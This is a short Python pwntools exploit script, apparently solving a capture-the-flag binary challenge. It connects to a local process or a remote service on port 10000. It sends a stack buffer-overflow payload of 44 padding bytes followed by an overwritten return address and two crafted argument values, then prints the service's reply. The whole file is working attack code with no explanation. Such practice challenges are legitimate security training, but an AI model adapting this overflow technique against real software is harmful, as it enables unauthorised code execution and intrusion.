from pwn import *
import argparse

parser = argparse.ArgumentParser(description='Determine local or remote')
parser.add_argument('-l', '--local', action='store_true')
args = parser.parse_args()

e = context.binary = binary = ELF("./task/task")

if args.local:
    conn = process()
else:
    conn = remote('rivit.dev', 10000)

payload = '\x00' * 44 + '\xd6\x91\x04\x08' + '\xee\xff\xc0\x00' + '\xc7\xfa\xff\xff'
# print(payload)

conn.recvuntil("Do you want to say something?")
conn.sendline(payload)

s = conn.recvall(timeout=10)
print("output", s)

conn.close()
